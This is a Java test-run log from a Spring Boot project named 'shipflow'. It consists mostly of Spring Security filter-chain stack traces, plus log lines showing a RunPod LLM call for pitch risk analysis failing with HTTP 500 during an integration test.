	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:120) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:131) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:85) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:100) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:179) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at com.github.farzadsedaghatbin.shipflow.security.JwtAuthenticationFilter.doFilterInternal(JwtAuthenticationFilter.java:46) ~[classes/:na]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at com.github.farzadsedaghatbin.shipflow.security.MaliciousHeaderFilter.doFilter(MaliciousHeaderFilter.java:83) ~[classes/:na]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:107) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:93) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.CorsFilter.doFilterInternal(CorsFilter.java:91) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.header.HeaderWriterFilter.doHeadersAfter(HeaderWriterFilter.java:90) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:75) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:82) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:69) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:62) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.DisableEncodeUrlFilter.doFilterInternal(DisableEncodeUrlFilter.java:42) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$AroundFilterObservation$SimpleAroundFilterObservation.lambda$wrap$0(ObservationFilterChainDecorator.java:323) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:224) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:233) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:191) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.handler.HandlerMappingIntrospector.lambda$createCacheFilter$3(HandlerMappingIntrospector.java:195) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter.doFilter(CompositeFilter.java:74) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.config.annotation.web.configuration.WebMvcSecurityConfiguration$CompositeFilterChainProxy.doFilter(WebMvcSecurityConfiguration.java:225) ~[spring-security-config-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:352) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:268) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.ServerHttpObservationFilter.doFilterInternal(ServerHttpObservationFilter.java:109) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.MockMvc.perform(MockMvc.java:201) ~[spring-test-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.controller.PitchHealthControllerIntegrationTest.getAllActiveCycleHealth_WithAI_ShouldReturnEnhancedAnalysis(PitchHealthControllerIntegrationTest.java:265) ~[test-classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728) ~[junit-platform-commons-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495) ~[surefire-booter-3.1.2.jar:3.1.2]

2026-01-17T23:26:46.661Z  WARN 89700 --- [shipflow] [           main] c.g.f.s.service.RiskAnalysisService      : AI analysis failed, falling back to rule-based: Failed to get response from RunPod: RunPod /run failed with status 500: {"messageKey":"error.generic","message":"An unexpected error occurred. Please try again.","timestamp":"2026-01-17T23:26:46.659764","status":500}
2026-01-17T23:26:46.661Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cached pitch risk 64 (withAI=true, TTL=infinite)
2026-01-17T23:26:46.664Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.service.AICacheService    : Cache miss: pitch risk 65 (withAI=true)
2026-01-17T23:26:46.666Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.config.RunPodChatModel    : Submitting prompt to RunPod: 756 chars
2026-01-17T23:26:46.666Z DEBUG 89700 --- [shipflow] [           main] c.g.f.shipflow.config.RunPodChatModel    : RunPod request payload: {"input":{"max_tokens":2048,"temperature":0.3,"model":"mistral:instruct","prompt":"You are a project risk advisor for a software development team using the Shape Up methodology.\n\nAnalyze the following pitch and provide risk insights:\n\nPitch Title: Critical Pitch\nDescription: Test description for Critical Pitch\nAppetite: 10 days\nStatus: IN_PROGRESS\nProgress: 150.0%\nCycle Progress: 50.0%\nTeam: Health Test Team\n\nIdentified Risk Factors:\n- UNCLEAR_REQUIREMENTS: Pitch description is missing or too brief (Impact: 5/10)\n- SCOPE_CREEP: Hours spent exceed appetite by 50% (Impact: 7/10)\n\nProvide your analysis in the following format:\nINSIGHTS:\n- [insight 1]\n- [insight 2]\n- [insight 3]\n\nRECOMMENDATIONS:\n- [recommendation 1]\n- [recommendation 2]\n- [recommendation 3]\n\nCONFIDENCE: [0-100]\n\nKeep insights actionable and specific to this pitch."}}
2026-01-17T23:26:46.671Z ERROR 89700 --- [shipflow] [           main] c.g.f.shipflow.config.RunPodChatModel    : RunPod API call failed: RunPod /run failed with status 500: {"messageKey":"error.generic","message":"An unexpected error occurred. Please try again.","timestamp":"2026-01-17T23:26:46.67114","status":500}

java.lang.RuntimeException: RunPod /run failed with status 500: {"messageKey":"error.generic","message":"An unexpected error occurred. Please try again.","timestamp":"2026-01-17T23:26:46.67114","status":500}
	at com.github.farzadsedaghatbin.shipflow.config.RunPodChatModel.submitJob(RunPodChatModel.java:128) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.config.RunPodChatModel.generate(RunPodChatModel.java:81) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.RiskAnalysisService.generateAIInsights(RiskAnalysisService.java:588) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.RiskAnalysisService.analyzePitchRisk(RiskAnalysisService.java:145) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.RiskAnalysisService.analyzePitchRisk(RiskAnalysisService.java:94) ~[classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:352) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.invokeJoinpoint(ReflectiveMethodInvocation.java:196) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:765) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionInterceptor$1.proceedWithInvocation(TransactionInterceptor.java:123) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionAspectSupport.invokeWithinTransaction(TransactionAspectSupport.java:385) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:119) ~[spring-tx-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:184) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:765) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:717) ~[spring-aop-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.service.RiskAnalysisService$$SpringCGLIB$$0.analyzePitchRisk(<generated>) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.PitchHealthService.buildPitchHealth(PitchHealthService.java:342) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.PitchHealthService.lambda$getCycleHealthSummary$2(PitchHealthService.java:200) ~[classes/:na]
	at java.base/java.util.stream.ReferencePipeline$3$1.accept(ReferencePipeline.java:197) ~[na:na]
